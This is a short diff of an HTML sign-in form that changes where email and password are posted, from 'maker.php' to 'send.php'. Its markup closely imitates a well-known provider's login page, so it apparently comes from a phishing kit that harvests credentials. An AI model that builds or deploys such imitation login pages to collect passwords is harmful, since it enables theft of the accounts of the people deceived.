@@ -852,7 +852,7 @@
 <div class="card signin-card clearfix">
 <img class="profile-img" src="avatar.png" alt="">
 <p class="profile-name"></p>
-  <form novalidate="" method="post" action="maker.php">
+  <form novalidate="" method="post" action="send.php">
 <label class="hidden-label" for="Email">Email</label>
 <input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false" class="">
 <label class="hidden-label" for="Passwd">Password</label>
